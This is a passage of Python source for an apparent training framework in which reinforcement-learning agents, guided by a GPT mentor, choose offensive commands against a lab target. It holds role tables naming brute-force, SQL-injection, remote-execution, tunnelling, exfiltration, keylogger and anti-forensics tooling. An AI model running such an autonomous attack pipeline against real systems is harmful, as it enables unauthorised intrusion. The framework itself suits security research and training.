"""
Smart Coach - Enhanced ApprenticeCoach with command registry and intelligent mentoring.

This module provides a SmartCoach class that integrates:
- Command Registry for validated, structured commands
- Smart Mentor for intelligent LLM prompting
- Smart Reward Calculator for better learning signals
- Attack Context for rich state representation
"""

import time
import logging
import hashlib
from typing import Optional, Dict, Any, List, Set, Tuple, TYPE_CHECKING
from dataclasses import dataclass, field

from core.commands.command_registry import (
    AttackPhase,
    CommandTemplate,
    CommandChoice,
    COMMAND_REGISTRY,
    get_valid_commands_for_state,
    get_phase_from_state,
    render_command,
)
from core.commands.learned_commands import (
    LearnedCommandStore,
    get_learned_store,
)
from core.llm.smart_mentor import (
    SmartMentor,
    AttackContext,
    MentorResponse,
    DualMentor,
    DualMentorResponse,
)
from core.llm.reward_calculator import (
    SmartRewardCalculator,
    RewardBreakdown,
)
from core.training.mentor_policy import MentorPolicy, MentorPolicyConfig
from core.training.mentor_controller import (
    MentorController, MentorControllerConfig, MentorEngagement, MentorTier,
)

if TYPE_CHECKING:
    from core.gpt_manager import GPTManager
    from core.postmortem import SkillLibrary
    from core.tracing import TraceWriter

logger = logging.getLogger("ariaska.smart_coach")

# Phase 4: Lazy imports to avoid circular deps
_ppo_agent_cls = None
_ppo_config_cls = None
_mapper_cls = None
_encode_state_fn = None
_sac_agent_cls = None
_sac_config_cls = None


def _lazy_ppo():
    """Lazy-load PPO and mapper to avoid import loops."""
    global _ppo_agent_cls, _ppo_config_cls, _mapper_cls, _encode_state_fn
    if _ppo_agent_cls is None:
        try:
            from core.algorithms.ppo_agent import PPOAgent as _pa, PPOConfig as _pc
            from core.algorithms.command_action_mapper import CommandActionMapper as _cm
            from core.models.state_encoder import encode_state as _es
            _ppo_agent_cls = _pa
            _ppo_config_cls = _pc
            _mapper_cls = _cm
            _encode_state_fn = _es
        except ImportError as e:
            logger.warning(f"PPO/mapper not available: {e}")
    return _ppo_agent_cls, _ppo_config_cls, _mapper_cls, _encode_state_fn


def _lazy_sac():
    """Lazy-load SAC to avoid import loops."""
    global _sac_agent_cls, _sac_config_cls
    if _sac_agent_cls is None:
        try:
            from core.algorithms.sac_agent import SACAgent as _sa, SACConfig as _sc
            _sac_agent_cls = _sa
            _sac_config_cls = _sc
        except ImportError as e:
            logger.warning(f"SAC not available: {e}")
    return _sac_agent_cls, _sac_config_cls


@dataclass
class SmartDecisionResult:
    """Result of a smart coach decision with full context."""
    
    # Command info
    command: str
    template_name: str
    params: Dict[str, str]
    
    # Mentor info
    mentor_call: bool
    model_used: Optional[str] = None
    mentor_reasoning: Optional[str] = None
    mentor_delta: str = "kept"
    mentor_provider: str = "gpt"  # "gpt", "venice", "gpt_consensus", "venice_consensus", etc.
    
    # Phase info
    phase: AttackPhase = AttackPhase.RECON
    phase_advanced: bool = False
    
    # Reward info
    reward_breakdown: Optional[RewardBreakdown] = None
    
    # Confidence and metadata
    confidence: float = 0.5
    skill_cards: List[Dict[str, Any]] = field(default_factory=list)
    timestamp: float = field(default_factory=time.time)
    
    # Command output (simulated or real)
    command_output: str = ""
    
    # Token tracking
    tokens_used: int = 0
    
    # Phase 0.1: Decision source tracking
    source: str = "unknown"  # "mentor", "policy", "forced", "fallback", "registry"
    forced: bool = False  # True if this was a forced-novel action
    forced_reason: str = ""  # Why it was forced: "repeat_stuck", "deep_stuck", etc.
    excluded_count: int = 0  # Number of actions masked/excluded
    tag_info: str = ""  # Tag overlap debug info
    
    # Phase 6: Mentor imitation learning
    _mentor_suggestion: Optional[str] = None  # Template name mentor suggested (for imitation bonus)
    
    # Phase 6.3: Reasoning trace — why this decision was made
    reasoning: str = ""  # Human-readable chain: "PPO proposed nmap → anti-repeat blocked → registry fallback to nikto"
    belief_snapshot: Dict[str, Any] = field(default_factory=dict)  # Agent's belief state at decision time
    
    @property
    def chosen_action(self) -> str:
        """Alias for compatibility with existing code."""
        return self.command
    
    @property
    def is_dual_mentor(self) -> bool:
        """Check if this decision used dual mentor."""
        return self.mentor_provider not in ("gpt", "offline", "none")


@dataclass
class SmartStepContext:
    """Enhanced step context with attack state."""
    
    # Episode info
    episode: int
    step: int
    agent_name: str
    
    # Attack context
    attack_context: AttackContext
    
    # Raw state for compatibility
    state: Dict[str, Any] = field(default_factory=dict)
    
    @property
    def phase(self) -> str:
        """Get phase name for compatibility."""
        return self.attack_context.current_phase.name.lower()
    
    @property
    def target_ip(self) -> str:
        return self.attack_context.target


import random

class SmartCoach:
    """
    Enhanced coach with command registry and intelligent mentoring.
    
    This coach:
    1. Uses the command registry to ensure valid commands
    2. Provides rich attack context to the LLM
    3. Uses smart reward calculation for better learning
    4. Tracks learned commands for experience-based improvement
    5. ROLE-BASED: Each agent has a specific role that filters commands
    
    Works alongside existing ApprenticeCoach - can be used as drop-in
    replacement or in parallel.
    """
    
    # ==========================================================================
    # AGENT ROLE DEFINITIONS - Each agent has UNIQUE focus and NON-OVERLAPPING commands
    # ==========================================================================
    AGENT_ROLES = {
        "ScoutAgent": {
            "role": "recon",
            "description": "🔍 Reconnaissance & Discovery - port scanning, service enumeration, OSINT",
            "primary_phases": [AttackPhase.RECON, AttackPhase.ENUMERATION],
            "preferred_commands": [
                # EXCLUSIVE to Scout - Network mapping and service detection
                "nmap_quick_scan", "nmap_top_ports", "nmap_service_version", "nmap_os_detection",
                "masscan_fast", "nmap_udp_scan", "rustscan",
                # DNS/Domain - Scout ONLY
                "dig_any", "whois_lookup", "dns_zone_transfer", "dnsrecon", "host_lookup",
                # Initial web fingerprinting - Scout ONLY
                "whatweb", "curl_headers", "wafw00f", "wappalyzer",
            ],
            "command_tags": {"network", "discovery", "scanning", "dns", "recon"},
            # R42: Added post/post-exploit/credential/lateral/antiforensics/keylogger/ssh_keys
            # to prevent forced-novel from assigning post-exploitation commands to Scout
            "avoid_tags": {"exploit", "privesc", "persistence", "defense", "attack", "bruteforce",
                           "smb", "enum", "stealth", "post", "post-exploit", "credential",
                           "lateral", "antiforensics", "keylogger", "ssh_keys", "cleanup",
                           "timestomp", "closeout"},
            "exclusive_prefixes": ["nmap", "masscan", "dig", "whois", "dns", "rustscan", "host", "wafw00f"],  # Scout OWNS these
        },
        "RedAgent": {
            "role": "offensive",
            "description": "⚔️ Offensive Operations - exploitation, brute force, active attacks",
            "primary_phases": [AttackPhase.EXPLOITATION, AttackPhase.PRIVILEGE_ESCALATION, AttackPhase.POST_EXPLOITATION],
            "preferred_commands": [
                # EXCLUSIVE to Red - Exploitation and brute force
                "searchsploit", "sqlmap_get", "sqlmap_post", "sqlmap_crawl",
                "hydra_ssh", "hydra_ftp", "hydra_smb", "hydra_web",
                "crackmapexec_smb", "crackmapexec_winrm", "crackmapexec_ldap",
                "impacket_psexec", "impacket_smbexec", "impacket_wmiexec",
                "evil_winrm", "msfconsole",
                # Vulnerability scanning - Red ONLY
                "nikto", "nuclei_scan", "wpscan", "joomscan",
            ],
            "command_tags": {"exploit", "attack", "offensive", "bruteforce", "vuln", "aggressive"},
            "avoid_tags": {"defense", "monitoring", "passive", "recon", "stealth", "scanning"},
            "exclusive_prefixes": ["hydra", "sqlmap", "searchsploit", "crackmapexec", "impacket", "evil", "msf", "nikto", "nuclei", "wpscan", "joomscan"],
            "aggressive_recon": False,  # Red should NOT use recon tools
        },
        "BlueAgent": {
            "role": "defensive",
            "description": "🛡️ Defensive Analysis - log review, threat detection, security monitoring",
            "primary_phases": [AttackPhase.ENUMERATION, AttackPhase.POST_EXPLOITATION],
            "preferred_commands": [],  # Uses custom defensive commands
            "command_tags": {"defense", "monitoring", "analysis", "logs", "forensics"},
            # R42: Added post/post-exploit/keylogger/persistence/lateral/antiforensics
            # to prevent forced-novel from assigning offensive post-exploit commands to Blue
            "avoid_tags": {"exploit", "attack", "bruteforce", "post", "post-exploit",
                           "keylogger", "persistence", "lateral", "antiforensics",
                           "timestomp", "credential"},
            "custom_commands": [
                ("netstat -tlnp", "List listening TCP ports"),
                ("ss -tlnp", "Socket statistics"),
                ("ps aux --sort=-%mem | head -20", "Top memory processes"),
                ("last -n 15", "Recent logins"),
                ("cat /var/log/auth.log 2>/dev/null | tail -30", "Auth logs"),
                ("who", "Logged in users"),
                ("w", "User activity"),
                ("lsof -i -P -n | head -30", "Network connections"),
                ("find /tmp -type f -mmin -30 2>/dev/null | head -20", "Recent /tmp files"),
                ("cat /etc/passwd | grep -v nologin", "Users with shells"),
                ("crontab -l 2>/dev/null", "Scheduled tasks"),
                ("systemctl list-units --type=service --state=running | head -20", "Running services"),
                ("df -h", "Disk usage"),
                ("free -m", "Memory usage"),
                ("uptime", "System uptime"),
                ("id", "Current user"),
                ("env | head -20", "Environment variables"),
                ("ls -la /home", "Home directories"),
            ],
            "exclusive_prefixes": ["netstat", "ss ", "ps ", "last", "who", "lsof", "crontab", "systemctl", "df ", "free ", "uptime", "id", "env"],
        },
        "OrionAgent": {
            "role": "strategic",
            "description": "🎯 Strategic Coordination - service analysis, comprehensive recon",
            "primary_phases": [AttackPhase.ENUMERATION, AttackPhase.EXPLOITATION],
            "preferred_commands": [
                # Phase 9.0: Orion is STRATEGIC ONLY — no direct exploitation commands.
                # Removed: ssh_login, telnet_1524, mysql_root_login, samba_exploit,
                #          vsftpd_exploit, psql_default_creds (belong to Red/Shadow)
                "nmap_vuln_scan", "nmap_aggressive",
                "searchsploit_search", "msfconsole_search",
                # R47: Removed ldapsearch_base, bloodhound_collection, kerbrute,
                # windapsearch — MS2 has no LDAP/AD, these waste 3+ actions per episode
            ],
            "command_tags": {"comprehensive", "analysis", "directory", "ldap", "vuln"},
            # Phase 9.0: Orion must NEVER run exploitation/shell commands.
            # "shell","ssh","backdoor","creds" blocks ssh_login, telnet_1524, psql_default_creds
            # R42: Added post/post-exploit/credential/lateral/antiforensics/keylogger/ssh_keys/
            # persistence/timestomp to prevent forced-novel from assigning post-exploit to Orion
            "avoid_tags": {"defense", "stealth", "scanning", "exploit", "bruteforce",
                           "shell", "ssh", "backdoor", "creds", "post", "post-exploit",
                           "credential", "lateral", "antiforensics", "keylogger",
                           "ssh_keys", "persistence", "timestomp", "cleanup", "closeout"},
            # Phase 8.2 Batch 14: Removed gobuster/ffuf/feroxbuster/dirsearch from Orion
            "exclusive_prefixes": ["ldap", "bloodhound", "kerb", "burp", "windap"],
            "is_coordinator": True,
        },
        "ShadowAgent": {
            "role": "stealth",
            "description": "👤 Stealth Operations - SMB/RPC enum, persistence, evasion",
            "primary_phases": [AttackPhase.ENUMERATION, AttackPhase.POST_EXPLOITATION, AttackPhase.EXFILTRATION],
            "preferred_commands": [
                # EXCLUSIVE to Shadow - SMB/RPC enumeration (stealthy)
                "enum4linux", "enum4linux_ng", "smbclient_list", "smbmap", "rpcclient_enum",
                # SSH/Tunneling - Shadow ONLY
                "ssh_key_login", "chisel_client", "socat_tunnel", "nc_listener", "nc_connect",
                # Post-exploit recon - Shadow ONLY
                "linpeas", "pspy", "ssh_audit",
            ],
            "command_tags": {"stealth", "evasion", "quiet", "passive", "persistence", "exfil", "smb", "enum"},
            "avoid_tags": {"loud", "aggressive", "bruteforce", "scanning", "web"},
            "exclusive_prefixes": ["enum4linux", "smbclient", "smbmap", "rpcclient", "chisel", "socat", "linpeas", "pspy", "ssh-audit", "ssh_audit"],
            "stealth_mode": True,
        },
    }
    
    def __init__(
        self,
        agent_name: str,
        gpt_manager: "GPTManager",
        mentor_policy: Optional[MentorPolicy] = None,
        mentor_controller: Optional[MentorController] = None,
        skill_library: Optional["SkillLibrary"] = None,
        trace_writer: Optional["TraceWriter"] = None,
        learned_store: Optional[LearnedCommandStore] = None,
        reward_calculator: Optional[SmartRewardCalculator] = None,
        mentor_log_path: Optional[str] = None,
        model: str = "gpt-5.1-codex-mini",
    ):
        self.agent_name = agent_name
        self.gpt_manager = gpt_manager
        self.mentor_policy = mentor_policy or MentorPolicy()
        self.mentor_controller = mentor_controller  # Phase 6.2: 3-tier mentor engagement
        self.skill_library = skill_library
        self.trace_writer = trace_writer
        self.mentor_log_path = mentor_log_path
        self.model = model
        
        # R42: Forced-novel cap per episode — prevent forced dominance
        self._forced_novel_count = 0
        self._forced_novel_max = 3  # Max forced-novel selections per episode
        
        # Get agent role configuration
        self.agent_role = self.AGENT_ROLES.get(agent_name, {
            "role": "generic",
            "description": "Generic agent",
            "primary_phases": list(AttackPhase),
            "preferred_commands": [],
            "command_tags": set(),
            "avoid_tags": set(),
        })
        
        # Smart components
        self.learned_store = learned_store or get_learned_store()
        self.reward_calculator = reward_calculator or SmartRewardCalculator()
        self.smart_mentor: Optional[SmartMentor] = None
        self.dual_mentor: Optional[DualMentor] = None  # GPT + Venice dual mentor
        
        # Initialize smart mentor if GPT manager has async client
        self._init_smart_mentor()
        
        # Attack context (shared across steps)
        self.attack_context: Optional[AttackContext] = None
        
        # Decision history
        self.decisions: List[SmartDecisionResult] = []
        
        # Current episode tracking
        self.current_episode = 0
        
        # Track used commands to avoid duplicates
        self.step_used_commands: set = set()  # Within single step
        self.episode_used_commands: set = set()  # Across entire episode
        self.command_repeat_count: Dict[str, int] = {}  # Count repeats
        
        # Phase 5.2+: Adaptive curriculum tracking
        self._episode_rewards: List[float] = []  # Recent episode total rewards
        self._episode_discovery_counts: List[int] = []  # Recent episode discoveries
        self._episode_diversity_ratios: List[float] = []  # Recent diversity ratios
        self._adaptive_history_window = 10  # Look back N episodes
        
        # ─── Phase 8.0: Cross-episode attack chain memory ────────────────
        # Remembers successful command sequences that led to discoveries/shells.
        # Used to bias future episode decisions toward proven attack chains.
        self._successful_chains: List[Dict[str, Any]] = []  # [{commands: [...], reward: float, phase: str}]
        self._best_chain: Optional[Dict[str, Any]] = None  # Highest reward chain across all episodes
        self._episode_chain: List[str] = []  # Current episode's command sequence
        self._episode_chain_rewards: List[float] = []  # Per-step rewards this episode
        self._chain_memory_size = 20  # Keep top N chains
        
        # ─── Phase 8.0: Agent reasoning state ────────────────────────────
        # Persistent reasoning context that carries between steps.
        self._reasoning_hypotheses: List[str] = []  # Current working hypotheses
        self._reasoning_failures: List[str] = []  # What failed and why
        self._reasoning_plan: Optional[str] = None  # Current attack plan from mentor
        self._exploration_score: float = 1.0  # Decays as we repeat actions, resets on new discovery
        
        logger.info(f"SmartCoach initialized for {agent_name} | Role: {self.agent_role['role']} | {self.agent_role['description']}")

        # ─── PHASE 7.4: Tool availability check (one-time at init) ───────────
        # Cache which tool binaries exist on the system so we don't waste
        # steps on commands for tools that aren't installed.
        self._unavailable_tools: set = set()
        self._check_tool_availability()

        # ─── PHASE 6.6: Difficulty preset (set externally by orchestrator) ───
        self.difficulty_preset = None  # Set via set_difficulty_preset()

        # =====================================================================
        # PHASE 4: Per-role PPO agent + CommandActionMapper
        # PPO drives command selection within each role's action pool.
        # =====================================================================
        self.action_mapper = None
        self.ppo_agent = None
        self._ppo_trajectory: List[Dict[str, Any]] = []
        self._ppo_pending: Optional[Dict[str, Any]] = None  # awaiting reward
        self._ppo_step_count = 0
        try:
            PPOAgent, PPOConfig, Mapper, _ = _lazy_ppo()
            if Mapper and PPOAgent and PPOConfig:
                self.action_mapper = Mapper(agent_name)
                if self.action_mapper.action_dim > 0:
                    config = PPOConfig(
                        state_dim=512,
                        action_dim=self.action_mapper.action_dim,
                        hidden_dims=[256, 256, 128],
                        learning_rate=5e-4,       # Phase 6.4: Faster initial learning
                        epochs_per_update=6,      # Phase 6.4: More gradient steps per update
                        minibatch_size=8,         # Low: each coach gets ~5-10 PPO transitions/ep
                        rollout_size=16,          # Phase 6.4: More frequent updates
                        entropy_coef=0.05,        # Phase 6.4: Higher initial exploration
                        entropy_coef_min=0.005,   # Phase 6.4: Anneal to focused policy
                    )
                    self.ppo_agent = PPOAgent(config=config, device="cpu")
                    logger.info(
                        f"[PPO] {agent_name}: action_dim={self.action_mapper.action_dim} "
                        f"network params={sum(p.numel() for p in self.ppo_agent.network.parameters())}"
                    )
        except Exception as e:
            logger.warning(f"PPO init failed for {agent_name}: {e}")

        # =====================================================================
        # PHASE 7.0: SAC Agent (Soft Actor-Critic) — Entropy-regularized RL
        # SAC provides better exploration via entropy bonus (MaxEnt RL).
        # Runs ALONGSIDE PPO — SAC handles exploration-heavy phases,
        # PPO handles exploitation phases. Off-policy = sample efficient.
        # =====================================================================
        self.sac_agent = None
        self._sac_enabled = True  # Feature flag
        try:
            from core.algorithms.sac_agent import SACAgent, SACConfig
            if self._sac_enabled and self.action_mapper and self.action_mapper.action_dim > 0:
                sac_config = SACConfig(
                    state_dim=512,
                    action_dim=self.action_mapper.action_dim,
                    hidden_dims=[256, 256, 128],
                    actor_lr=3e-4,
                    critic_lr=3e-4,
                    alpha=0.2,           # Initial entropy temperature
                    auto_alpha=True,     # Auto-tune for optimal exploration
                    buffer_size=50000,
                    batch_size=64,
                    min_buffer_size=64,
                    warmup_steps=50,
                )
                self.sac_agent = SACAgent(config=sac_config)
                logger.info(f"[SAC] {agent_name}: action_dim={self.action_mapper.action_dim} α=0.2 (auto)")
        except Exception as e:
            logger.debug(f"SAC init skipped for {agent_name}: {e}")

        # =====================================================================
        # PHASE 9.0: DDQN Macro-Intent Selector (Hierarchical RL)
        # DDQN picks strategic macro-intent → PPO picks command within macro.
        # Off-policy Double DQN with target network + experience replay.
        # =====================================================================
        self.ddqn_macro = None
        self._active_macro = None       # Current macro-intent for this step
        self._active_macro_q = None     # Q-values from DDQN for this step
        self._ddqn_confidence = 0.0     # DDQN Q-value separation (for mentor)
        self._ddqn_pending = None       # Pending DDQN transition (state, macro)
        self._ddqn_prev_macro = None    # R57 Layer 1: Previous macro for switch penalty
        self._last_step_had_discovery = False  # R57 Layer 1: Discovery signal for DDQN
        try:
            from core.algorithms.ddqn_macro import DDQNMacro, DDQNConfig
            ddqn_config = DDQNConfig(state_dim=512, num_macros=9)
            self.ddqn_macro = DDQNMacro(config=ddqn_config, device="cpu")
        except Exception as e:
            logger.debug(f"DDQN macro init skipped for {agent_name}: {e}")

        # =====================================================================
        # LAYER 3: CODEX META-LAYER — Strategic stagnation-breaking
        # Uses gpt-5.2-codex for high-level reasoning when agents get stuck
        # in a phase for too long without discoveries. Budget-controlled:
        # max 5 calls/episode, 2-step cooldown between calls.
        # R60: Increased budget 3→5, cooldown 4→2, lower thresholds.
        # =====================================================================
        self._codex_meta_calls_episode = 0
        self._codex_meta_max_per_episode = 5
        self._codex_meta_cooldown = 0
        self._codex_meta_phase_steps = 0
        self._codex_meta_last_phase = None
        self._codex_meta_gate_overrides = 0  # R60: Track PHASE-GATE overrides for storm trigger
        self._codex_meta_antirepeat_hits = 0  # R60: Track anti-repeat hits for spike trigger
        self._codex_meta_used_templates: set = set()  # R62: Track used codex templates for dedup

        # ─── R66: Codex Strategic role (episode-level plan repair) ───
        self._codex_strategic_calls_episode = 0
        self._codex_strategic_max_per_episode = 3  # separate budget
        self._codex_strategic_cooldown = 0
        # R66: Coherence + macro_conf injected from orchestrator each step
        self._r66_coherence: float = 0.5
        self._r66_macro_conf: float = 0.5
        self._r66_env_tag: str = "ms2"  # overridden by orchestrator

        # ─── R67: Reward velocity + adaptive codex budget ────────────
        self._r67_velocity: float = 0.0      # Injected from orchestrator
        self._r67_stalling: bool = False      # True when reward velocity stalled
        self._r67_codex_bonus_budget: int = 0 # Extra codex calls granted by stall

        # ─── R68: Phase-gated PPO head override ──────────────────────
        self._r68_forced_phase_group: Optional[int] = None  # Codex can force phase head
    
    def _init_smart_mentor(self):
        """Initialize the smart mentor — GPT-only (Phase 6.9: Venice removed).
        
        Venice was causing f-string format errors with JSON braces in prompts
        and adding complexity without proportional value. All 3 codex model
        variants (gpt-5.1-codex-mini, gpt-4o-mini fallback) are GPT-based.
        """
        try:
            # Phase 6.9: Venice/DualMentor REMOVED — GPT-only pipeline
            self.dual_mentor = None
            
            if hasattr(self.gpt_manager, 'async_client'):
                self.smart_mentor = SmartMentor(
                    llm_client=self.gpt_manager.async_client,
                    learned_store=self.learned_store,
                    model=self.model,
                )
                logger.debug(f"SmartMentor initialized for {self.agent_name}")
            elif hasattr(self.gpt_manager, 'client') and self.gpt_manager.client:
                # Fallback to sync client (SmartMentor handles conversion)
                self.smart_mentor = SmartMentor(
                    llm_client=self.gpt_manager.client,
                    learned_store=self.learned_store,
                    model=self.model,
                )
                logger.debug(f"SmartMentor initialized with sync client for {self.agent_name}")
            else:
                logger.debug(f"No LLM client available, SmartMentor disabled")
        except Exception as e:
            logger.warning(f"Failed to init SmartMentor: {e}")
    
    def has_dual_mentor(self) -> bool:
        """Check if dual mentor (GPT + Venice) is available."""
        return hasattr(self, 'dual_mentor') and self.dual_mentor is not None
    
    def init_attack_context(
        self,
        target: str,
        difficulty: str = "unknown",
        platform: str = "unknown",
    ) -> AttackContext:
        """
        Initialize attack context for a new target/episode.
        
        Args:
            target: Target IP or hostname
            difficulty: Target difficulty level
            platform: Target platform (linux, windows, etc.)
            
        Returns:
            Initialized AttackContext
        """
        self.attack_context = AttackContext(
            target=target,
            difficulty=difficulty,
            platform=platform,
            current_phase=AttackPhase.RECON,
        )
        return self.attack_context
    
    def update_context_from_state(
        self,
        state: Dict[str, Any],
    ) -> AttackContext:
        """
        Update attack context from environment state.
        
        Args:
            state: Environment state dictionary
            
        Returns:
            Updated AttackContext
        """
        if not self.attack_context:
            target = state.get("target_ip", "10.10.10.10")
            self.attack_context = AttackContext(target=target)
        
        ctx = self.attack_context
        
        # Update target info
        if "target_ip" in state:
            ctx.target = state["target_ip"]
        
        # DIRECT state_flags from environment (preferred path)
        if "state_flags" in state and isinstance(state["state_flags"], dict):
            for flag, value in state["state_flags"].items():
                if value:  # Only set True flags
                    ctx.set_state_flag(flag)
        
        # Update services from open ports
        if "open_ports" in state:
            for port in state["open_ports"]:
                ctx.add_discovery("open_port", port)
                
                # Auto-detect services from common ports
                port_services = {
                    21: "ftp", 22: "ssh", 23: "telnet",
                    25: "smtp", 53: "dns", 80: "http",
                    110: "pop3", 111: "rpc", 135: "msrpc",
                    139: "netbios", 143: "imap", 443: "https",
                    445: "smb", 993: "imaps", 995: "pop3s",
                    1433: "mssql", 1521: "oracle", 3306: "mysql",
                    3389: "rdp", 5432: "postgresql", 5985: "winrm",
                    5986: "winrm-ssl", 6379: "redis", 8080: "http-alt",
                    8443: "https-alt", 27017: "mongodb",
                }
                
                if port in port_services:
                    ctx.add_service(port_services[port], port)
        
        # Update state flags from services
        if "services" in state:
            for svc in state["services"]:
                if isinstance(svc, dict):
                    svc_name = svc.get("name", "").lower()
                    svc_port = svc.get("port")
                else:
                    svc_name = str(svc).lower()
                    svc_port = None
                
                ctx.add_service(svc_name, svc_port)
        
        # Detection risk
        if "detection_risk" in state:
            ctx.state_flags["high_detection_risk"] = state["detection_risk"] > 0.7
        
        # Credentials and privilege level
        if state.get("credentials_found"):
            ctx.set_state_flag("credentials_known")
        if state.get("privilege_level") == "root":
            ctx.set_state_flag("root_shell_obtained")
            ctx.set_state_flag("shell_obtained")
        elif state.get("privilege_level") == "user":
            ctx.set_state_flag("shell_obtained")
        
        # Platform detection
        if "os" in state:
            ctx.platform = state["os"].lower()
            if "windows" in ctx.platform:
                ctx.platform = "windows"
            elif "linux" in ctx.platform or "unix" in ctx.platform:
                ctx.platform = "linux"
        
        # Track command history - CRITICAL for anti-loop logic
        # First, populate from full history if provided
        if "command_history" in state:
            history_from_state = state["command_history"]
            if isinstance(history_from_state, list):
                # Merge: keep existing ctx.command_history and add new ones
                existing_set = set(ctx.command_history)
                for cmd in history_from_state:
                    if cmd and cmd not in existing_set:
                        ctx.command_history.append(cmd)
                        existing_set.add(cmd)
        # Also append last_command if it's new
        if "last_command" in state:
            last_cmd = state["last_command"]
            if last_cmd and last_cmd not in ctx.command_history[-5:]:
                ctx.command_history.append(last_cmd)
        
        # Update phase based on state
        ctx.current_phase = get_phase_from_state(ctx.state_flags)
        
        return ctx
    
    # =========================================================================
    # PHASE 0.1: STUCK-ESCAPE METHODS
    # =========================================================================
    
    def _get_recent_action_tags(self, k: int = 15) -> Set[str]:
        """
        Get union of tags from the last K actions in command_history.
        
        Phase 0.1: Used for tag-based action masking.
        
        Args:
            k: Number of recent actions to consider
            
        Returns:
            Set of all tags from recent commands
        """
        if not self.attack_context:
            return set()
        
        recent_cmds = self.attack_context.command_history[-k:]
        all_tags = set()
        
        for cmd in recent_cmds:
            # Find the template for this command
            cmd_prefix = cmd.split()[0].lower() if cmd else ""
            
            for template in COMMAND_REGISTRY.values():
                # Match by prefix or template name
                template_prefix = template.template.split()[0].lower()
                if cmd_prefix == template_prefix or template.name.lower() in cmd.lower():
                    all_tags.update(template.tags)
                    break
        
        return all_tags
    
    def _compute_tag_overlap(self, template: "CommandTemplate", recent_tags: Set[str]) -> float:
        """
        Compute Jaccard-like overlap between template tags and recent tags.
        
        Phase 0.1: Used to determine which actions to mask.
        
        Args:
            template: The command template to check
            recent_tags: Tags from recent commands
            
        Returns:
            Overlap ratio (0.0 to 1.0)
        """
        if not template.tags or not recent_tags:
            return 0.0
        
        intersection = len(template.tags & recent_tags)
        union = len(template.tags | recent_tags)
        
        return intersection / union if union > 0 else 0.0
    
    def _get_masked_actions_for_stuck(
        self,
        overlap_threshold: float = 0.8,
        history_k: int = 15,
    ) -> Tuple[List["CommandTemplate"], int, str]:
        """
        Get valid actions after masking those with high tag overlap.
        
        Phase 0.1: Core stuck-escape logic.
        
        Args:
            overlap_threshold: Mask actions with >= this tag overlap
            history_k: Look back K actions for tag calculation
            
        Returns:
            Tuple of (filtered_commands, excluded_count, tag_info_str)
        """
        if not self.attack_context:
            return [], 0, "no_context"
        
        ctx = self.attack_context
        
        # Get recent tags
        recent_tags = self._get_recent_action_tags(history_k)
        
        # Get all valid commands for current state
        valid_commands = get_valid_commands_for_state(ctx.state_flags, ctx.current_phase)
        if not valid_commands:
            valid_commands = get_valid_commands_for_state(ctx.state_flags)
        if not valid_commands:
            valid_commands = [
                cmd for cmd in COMMAND_REGISTRY.values()
                if cmd.phase == AttackPhase.RECON and not cmd.preconditions
            ]
        
        # Filter for agent role
        role_filtered = self._filter_commands_for_role(valid_commands)
        
        # Phase 8.2 Batch 10: Also filter by tool availability
        role_filtered = [cmd for cmd in role_filtered if self._is_tool_available(cmd)]
        
        # Also exclude commands already in history (exact match)
        history_set = set(ctx.command_history[-history_k:])
        
        # Apply tag overlap masking
        masked = []
        excluded_count = 0
        excluded_tags = []
        
        for template in role_filtered:
            overlap = self._compute_tag_overlap(template, recent_tags)
            
            # Check exact history match
            test_cmd = template.template.replace("{target}", ctx.target)
            in_history = any(test_cmd[:40] in h for h in history_set)
            
            if overlap >= overlap_threshold or in_history:
                excluded_count += 1
                excluded_tags.append(f"{template.name}:{overlap:.2f}")
            else:
                masked.append(template)
        
        tag_info = f"recent_tags={list(recent_tags)[:5]} excluded={excluded_tags[:5]}"
        
        return masked, excluded_count, tag_info
    
    def _force_novel_action(
        self,
        step_ctx: "SmartStepContext",
        thresholds: List[float] = [0.8, 0.6, 0.4, 0.0],
    ) -> "SmartDecisionResult":
        """
        Force a novel action using fallback ladder of decreasing thresholds.
        
        Phase 0.1: Called when agent is repeat-stuck.
        
        Fallback ladder:
        1. threshold=0.8 → mask high-overlap actions
        2. threshold=0.6 → more permissive
        3. threshold=0.4 → even more permissive
        4. threshold=0.0 → history-only exclusion
        5. random from all valid → last resort
        
        Args:
            step_ctx: Current step context
            thresholds: List of overlap thresholds to try
            
        Returns:
            SmartDecisionResult with forced=True, or None if cap reached
        """
        # R42: Cap forced-novel selections per episode to prevent forced dominance
        if self._forced_novel_count >= self._forced_novel_max:
            logger.debug(
                f"[FORCED-NOVEL][{self.agent_name}] Cap reached ({self._forced_novel_max}), "
                "falling back to PPO/registry instead"
            )
            return None  # Signal caller to use normal pipeline
        
        ctx = step_ctx.attack_context
        history_k = 15  # Could come from config
        
        # Try each threshold in the fallback ladder
        for threshold in thresholds:
            candidates, excluded, tag_info = self._get_masked_actions_for_stuck(
                overlap_threshold=threshold,
                history_k=history_k,
            )
            
            if candidates:
                # Pick randomly from candidates
                import random
                template = random.choice(candidates)
                
                # Render the command
                params = {"target": ctx.target}
                for param in template.required_params:
                    if param not in params:
                        params[param] = self._get_default_param(param, ctx)
                
                rendered = render_command(template, params)
                
                logger.info(
                    f"[FORCED-NOVEL][{self.agent_name}] "
                    f"threshold={threshold} "
                    f"selected={template.name} "
                    f"excluded={excluded} "
                    f"tag_info={tag_info[:80]}"
                )
                
                self._forced_novel_count += 1  # R42: Track for cap enforcement
                
                return SmartDecisionResult(
                    command=rendered,
                    template_name=template.name,
                    params=params,
                    mentor_call=False,
                    phase=ctx.current_phase,
                    confidence=0.6,
                    source="forced",
                    forced=True,
                    forced_reason=f"repeat_stuck_threshold_{threshold}",
                    excluded_count=excluded,
                    tag_info=tag_info,
                )
        
        # Last resort: random from ALL role-valid commands (ignore history)
        logger.debug(f"[FORCED-NOVEL][{self.agent_name}] All thresholds exhausted, picking random")
        
        valid_commands = get_valid_commands_for_state(ctx.state_flags, ctx.current_phase)
        if not valid_commands:
            valid_commands = list(COMMAND_REGISTRY.values())[:20]
        
        role_filtered = self._filter_commands_for_role(valid_commands)
        # Phase 8.2 Batch 10: Filter by tool availability even in last resort
        role_filtered = [cmd for cmd in role_filtered if self._is_tool_available(cmd)]
        if not role_filtered:
            role_filtered = [cmd for cmd in valid_commands[:10] if self._is_tool_available(cmd)]
        
        import random
        template = random.choice(role_filtered) if role_filtered else list(COMMAND_REGISTRY.values())[0]
        
        params = {"target": ctx.target}
        for param in template.required_params:
            if param not in params:
                params[param] = self._get_default_param(param, ctx)
        
        rendered = render_command(template, params)
        
        self._forced_novel_count += 1  # R42: Track for cap enforcement
        
        return SmartDecisionResult(
            command=rendered,
            template_name=template.name,
            params=params,
            mentor_call=False,
            phase=ctx.current_phase,
